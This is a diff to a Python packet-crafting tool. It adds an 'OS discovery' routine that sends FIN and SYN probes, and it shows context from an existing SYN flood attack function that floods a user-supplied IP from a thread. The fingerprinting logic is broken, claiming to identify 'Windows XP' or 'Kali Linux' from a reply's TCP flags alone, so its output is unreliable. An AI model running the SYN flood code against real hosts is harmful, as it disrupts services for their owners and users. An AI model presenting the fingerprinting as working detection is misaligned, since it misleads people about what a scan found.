@@ -197,10 +197,37 @@ def perform_os_discovery(ip_addr=None):
         # Get input from the user
         ip_addr = input("Enter the IP address to scan: ")
 
-    return "OS discovery performed on " + ip_addr
+    # Send TCP packet with the FIN flag set
+    fin_packet = IP(dst=ip_addr) / TCP(flags="F")
+    fin_response = sr1(fin_packet, timeout=1, verbose=0)
+
+    # Send TCP packet with the SYN flag set
+    syn_packet = IP(dst=ip_addr) / TCP(flags="S")
+    syn_response = sr1(syn_packet, timeout=1, verbose=0)
+
+    os_result = "Unknown OS"
+
+    if fin_response:
+        os_result = os_fingerprint(fin_response)
+    elif syn_response:
+        os_result = os_fingerprint(syn_response)
+
+    return "OS discovery performed on {}. Detected OS: {}".format(ip_addr, os_result)
 
 
-#(11) Code to perform syn flood attack
+# Determine the OS based on the TCP flags
+def os_fingerprint(packet):
+    if packet.haslayer(TCP) and packet[TCP].flags:
+        tcp_flags = packet[TCP].flags
+        if tcp_flags & 0x01 and tcp_flags & 0x10:  # FIN and ACK flags
+            return "Windows XP"
+        elif tcp_flags & 0x02 and not tcp_flags & 0x10:  # SYN flag without ACK flag
+            return "Kali Linux"
+
+    return "Unknown OS"
+
+
+# (11) Code to perform syn flood attack
 def perform_syn_flood_attack(ip_addr=None):
     if not ip_addr:
         # Get input from the user
@@ -214,7 +241,7 @@ def perform_syn_flood_attack(ip_addr=None):
     def send_packet():
         while not stop_flag.is_set():
             send(packet, verbose=0)
-    
+
     # Crea un thread per eseguire l'attacco SYN flood
     attack_thread = threading.Thread(target=send_packet)
     attack_thread.start()
@@ -226,7 +253,7 @@ def perform_syn_flood_attack(ip_addr=None):
     stop_flag.set()
 
     # Wait for the attack thread to finish
-    attack_thread.join()    
+    attack_thread.join()
 
     return "SYN flood attack performed on " + ip_addr
 
